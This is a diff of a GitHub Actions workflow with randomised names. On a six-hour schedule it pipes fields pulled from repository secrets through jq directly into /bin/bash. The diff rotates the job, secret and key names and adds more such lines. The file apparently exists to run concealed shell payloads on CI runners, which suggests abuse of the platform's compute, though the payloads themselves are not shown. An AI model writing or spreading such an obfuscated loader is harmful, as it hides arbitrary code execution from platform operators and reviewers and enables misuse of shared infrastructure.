@@ -3,24 +3,26 @@ name: hutujing8718
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 4/6 * * *'
+    - cron: '26 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hutujing8718
         env:
-          apbek605: ${{ secrets.apbek605 }}
+          du3146: ${{ secrets.du3146 }}
         run: |
-          echo $apbek605 | jq -r .aqdl5 | /bin/bash
-          echo $zfdhb0016 | jq -r .ibivg691 | /bin/bash
-          echo $eko42442 | jq -r .n31296 | /bin/bash
-          echo $i12335 | jq -r .md1 | /bin/bash
-          echo $v01001 | jq -r .ldrb793 | /bin/bash
-          echo $mjrv47 | jq -r .ft9 | /bin/bash
-          echo $xtha89074 | jq -r .xfsof91 | /bin/bash
-          echo $idaks048 | jq -r .qki9 | /bin/bash
-          echo $pgsy890 | jq -r .mqvd97391 | /bin/bash
+          echo $du3146 | jq -r .hu2 | /bin/bash
+          echo $soq09 | jq -r .neo5986 | /bin/bash
+          echo $u88 | jq -r .pzu08205 | /bin/bash
+          echo $ycc78 | jq -r .stol64 | /bin/bash
+          echo $hurst702 | jq -r .e3 | /bin/bash
+          echo $h9348 | jq -r .lghhf543 | /bin/bash
+          echo $e8 | jq -r .z5631 | /bin/bash
+          echo $przb55102 | jq -r .bmrhs9 | /bin/bash
+          echo $oc647 | jq -r .tsltx257 | /bin/bash
+          echo $pg60 | jq -r .roqig1 | /bin/bash
 
